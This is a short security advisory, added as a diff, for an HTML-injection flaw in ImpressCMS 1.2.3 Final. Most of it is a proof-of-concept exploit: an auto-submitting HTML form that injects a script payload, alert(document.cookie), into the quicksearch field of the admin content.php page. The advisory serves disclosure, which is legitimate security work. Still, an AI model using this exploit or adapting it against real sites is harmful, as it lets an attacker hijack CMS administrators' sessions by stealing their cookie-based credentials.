@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/45541/info
+
+ImpressCMS is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+ImpressCMS 1.2.3 Final is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/modules/content/admin/content.php" method="post" name="main">
+<input type="hidden" name="quicksearch_ContentContent" value=&#039;search"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="button_quicksearch_ContentContent" value="Search">
+<input type="hidden" name="filtersel" value="default">
+<input type="hidden" name="limitsel" value="15">
+</form>
+<script>
+document.main.submit();
+</script>
